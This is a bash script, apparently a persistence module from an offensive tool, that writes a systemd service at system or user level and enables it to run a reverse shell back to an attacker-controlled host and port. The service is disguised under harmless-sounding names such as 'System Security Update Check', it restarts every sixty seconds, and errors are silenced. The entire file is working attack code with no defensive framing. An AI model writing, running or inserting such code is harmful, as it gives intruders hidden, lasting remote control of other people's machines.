#!/bin/bash
# -----------------------------------------------------------------------------
# Registers a background service unit to maintain persistent execution.
# -----------------------------------------------------------------------------

_have systemctl || exit 0

SERVICE_NAME="system-update-check.service"
LHOST="${DECLUSOR_LHOST:-ATTACKER_IP}"
LPORT="${DECLUSOR_LPORT:-ATTACKER_PORT}"
PAYLOAD="/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"

if [ "$(id -u 2>/dev/null || echo 1)" -eq 0 ] && [ -d "/etc/systemd/system" ] && [ -w "/etc/systemd/system" ]; then
    SERVICE_PATH="/etc/systemd/system/$SERVICE_NAME"
    cat <<EOF > "$SERVICE_PATH" 2>/dev/null
[Unit]
Description=System Security Update Check
After=network.target

[Service]
Type=simple
ExecStart=$PAYLOAD
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

    if [ -f "$SERVICE_PATH" ]; then
        systemctl daemon-reload >/dev/null 2>&1
        systemctl enable "$SERVICE_NAME" >/dev/null 2>&1
        systemctl start "$SERVICE_NAME" >/dev/null 2>&1
        printf '[+] Registered system service at %s\n' "$SERVICE_PATH" | label "Service Persistence"
    fi
elif [ -n "${HOME:-}" ]; then
    USER_SERVICE_DIR="$HOME/.config/systemd/user"
    mkdir -p "$USER_SERVICE_DIR" 2>/dev/null || exit 0
    USER_SERVICE_PATH="$USER_SERVICE_DIR/$SERVICE_NAME"

    cat <<EOF > "$USER_SERVICE_PATH" 2>/dev/null
[Unit]
Description=User Sync Service

[Service]
ExecStart=$PAYLOAD
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

    if [ -f "$USER_SERVICE_PATH" ]; then
        systemctl --user daemon-reload >/dev/null 2>&1
        systemctl --user enable "$SERVICE_NAME" >/dev/null 2>&1
        systemctl --user start "$SERVICE_NAME" >/dev/null 2>&1
        printf '[+] Registered user service at %s\n' "$USER_SERVICE_PATH" | label "Service Persistence"
    fi
fi
